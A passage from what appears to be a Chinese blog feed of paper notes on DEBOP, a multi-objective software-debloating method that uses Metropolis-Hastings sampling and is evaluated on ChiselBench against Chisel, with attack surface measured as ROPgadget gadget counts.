mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> ),被接受的概率称为 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>→</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mfrac><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>O</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(p&#x27;_i \rightarrow p&#x27;_{i+1})=min(1,\frac{exp(k*O(p,p&#x27;_{i+1})) }{exp(k*O(p,p&#x27;_i)) })</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1072em;vertical-align:-0.3053em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3053em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4218em;vertical-align:-0.9629em;"></span><span class="mord mathnormal">min</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4589em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7337em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.707em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9629em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p></li><li><p>总的MH算法从样本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p_0&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span></eq> 开始,随后迭代执行以下步骤</p><ul><li><ol><li>从 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq> 中随机生成一个新的样本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ol></li><li><ol start="2"><li>计算 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>→</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(p&#x27;_i \rightarrow p&#x27;_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>以概率 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>→</mo><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(p&#x27;_i \rightarrow p&#x27;_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 接受 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span></span></span></span></eq> ,否则拒绝 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0689em;vertical-align:-0.317em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.317em;"><span></span></span></span></span></span></span></span></span></span></eq> ,并保持 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>p</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">p&#x27;_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0106em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span></eq> 作为下一个样本</li></ol></li></ul></li><li><p>下图明确了DEBOP使用的MH算法</p><ul><li>1到5行初始化,6到21行是迭代</li><li>在每次迭代中,从当前样本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">ps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></eq> 突变到一个新样本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">ps&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq> ,有两种方式<ul><li><ol><li>从程序中随机选择一个语句</li></ol></li><li><ol start="2"><li>从 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">ps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></eq> 中加入或删除这一语句(7-11行)</li></ol></li></ul></li><li>随后算法根据公式 计算接收概率,直到产生样本数为n个</li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(5)_1.png" alt></p><h3 id="4-%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81%E8%AF%84%E4%BC%B0" tabindex="-1">4 概念验证评估</h3><ul><li>探究两个问题<ul><li>RQ1:当提供不同的 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo separator="true">,</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha,\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> 参数时,DEBOP的产生的简化程序在sr,ar,g之间如何权衡?</li><li>RQ2:DEBOP的简化与具体单目标的简化方法相比如何</li></ul></li></ul><h4 id="%E5%AE%9E%E7%8E%B0" tabindex="-1">实现</h4><ul><li>用C++实现DEBOP原型</li><li>使用Clang构建p的AST来识别其语句</li><li>用(GCC v7.4.0 -O3) 编译简化程序后的运行大小来衡量程序大小</li><li>使用ROPgadget来识别程序的gadget数量,衡量程序攻击面</li></ul><h4 id="%E5%AE%9E%E9%AA%8C%E8%AE%BE%E7%BD%AE" tabindex="-1">实验设置</h4><ul><li>ChiselBench</li><li>设置1s超时限制,防止未终止</li><li>设置1000个样本,k=50来计算期望概率</li></ul><h4 id="4.1-rq1%E7%BB%93%E6%9E%9C" tabindex="-1">4.1 RQ1结果</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(5)_2.png" alt="RQ1"></p><ul><li>当 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></eq> 增加时,sr更接近ar,因为生成的程序更倾向攻击面减少</li><li>当 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> 增加时,即更重视通用性,g增加而sr,ar减少</li><li>以上结果证实了DEBOP可以在简化过程中进行不同的权衡</li></ul><h4 id="4.2-rq2%E7%BB%93%E6%9E%9C" tabindex="-1">4.2 RQ2结果</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(5)_3.png" alt="RQ2"></p><ul><li><p>由于空间限制,只展示每个 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></eq> 下Debop的分数和Chisel分数的比率,这些比率是在考虑的九个β值上计算得出的平均值和标准差。</p></li><li><p>上表的扩展版本可以在网上找到。</p></li><li><p>与Chisel进行对比</p><ul><li>DEBOP在sr,ar,g之间权衡,而Chisel只考虑sr</li><li>在sr上,Chisel比Debop好</li><li>ar,g上,Debop比Chisel好</li></ul></li><li><p>且Debop后续可以再改进</p></li></ul><h3 id="5-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">5 相关工作</h3><ul><li>很少有简化的工作考虑多个目标,我们的方法基于MCMC技术用多目标思想来考虑这一问题</li><li>我们的工作也与用MCMC解决其它问题有关,如超优化[20],以及更广泛的使用遗传算法来改进软件的技术[16]</li></ul><h3 id="6-%E7%BB%93%E8%AE%BA%E5%92%8C%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C" tabindex="-1">6 结论和未来工作</h3><ul><li><p>我们提出了一种新的通用的程序去膨胀方法,将其视为多目标优化问题</p></li><li><p>并且我们提出了DEBOP,为我们方法的一个具体实例,考虑了三个去膨胀目标,并使用MCMC技术来解决它.</p></li><li><p>最后，我们通过概念验证评估展示了我们方法的可行性和潜在用途</p></li><li><p>未来工作,除更广泛的评估外</p><ul><li>我们将研究如何通过使用(1) 除语句之外的其它变异元素(2)基于程序结构的变异,来改进算法</li><li>同样计划研究其它采样算法(Gibbs sampling[10]),其它随机搜索算法 (genetic programming[15]) 来进行优化</li><li>在更长期和更广泛的未来研究方向上，我们提出的方法具有通用性，可以应用于去臃肿之外的领域。特别是，我们计划在我们的方法的背景下研究资源适应[8]、能源减少[21]和程序修复方面的应用。</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (4)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(4)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(4)/</url>
      
